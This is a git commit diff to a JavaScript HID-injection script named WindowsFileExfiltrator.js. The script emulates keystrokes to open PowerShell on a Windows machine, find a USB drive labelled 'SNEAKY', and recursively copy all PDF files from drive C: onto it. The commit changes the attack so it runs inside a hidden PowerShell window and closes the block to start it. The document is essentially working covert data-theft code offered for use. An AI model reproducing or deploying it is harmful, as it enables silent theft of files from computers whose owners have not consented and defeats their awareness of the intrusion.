c179dee5bdee43ffc21fdbfcc09f6084b0a65c77
Calvin L <47407549+Coderdude112@users.noreply.github.com>
2020-04-22 21:07:02 -0600

    Update WindowsFileExfiltrator.js

--- HID-Scripts/WindowsFileExfiltrator.js
+++ HID-Scripts/WindowsFileExfiltrator.js
@@ -12,16 +12,17 @@ function Attack() { 		// Initalizes the function Attack that acually exfiltrates
   press("GUI r");			// Opens a run command
   delay(500);
   type("powershell\n");		// Opens powershell
-  delay(1000);
+  delay(500);
 
   var FileTypes = ["*.pdf"] // The file extensions that will be exfiltrated
   var SearchDrive = ["C:"] 	// The path to look for files NOTE: this will include ALL folders and sub-folders
+  
+  type("powershell -windowstyle hidden {"); 																								// Makes the window hidden for the duration of the attack
+  type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name;"); 												// Find the drive named "SNEAKY" and save it's path
+  type("Get-ChildItem C: -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name};"); 					// Searches and copies the files in '3D Objects', 'Downloads', 'Documents', ect.
+  type("Get-ChildItem " + SearchDrive + "/ -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name};"); 	// Searches and copies the files in the SearchDrive
 
-  type("$usbPath = Get-WMIObject Win32_Volume | ? { $_.Label -eq 'SNEAKY' } | select name\n"); 												// Find the drive named "SNEAKY" and save it's path
-  type("Get-ChildItem C: -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name}\n"); 					// Searches and copies the files in '3D Objects', 'Downloads', 'Documents', ect.
-  type("Get-ChildItem " + SearchDrive + "/ -Recurse -Include " + FileTypes + " | ForEach-Object ` {copy $_ -Destination $usbPath.name}\n"); // Searches and copies the files in the SearchDrive
-
-  type("exit\n");  			// Closes out 
+  type("}\n");  																															// Adds the close curly bracket making the attack hidden and starts the attack 
 }
 
 function Initalized() { 	// Initalizes the function that checks if the device has been initalized by the host before running the attack
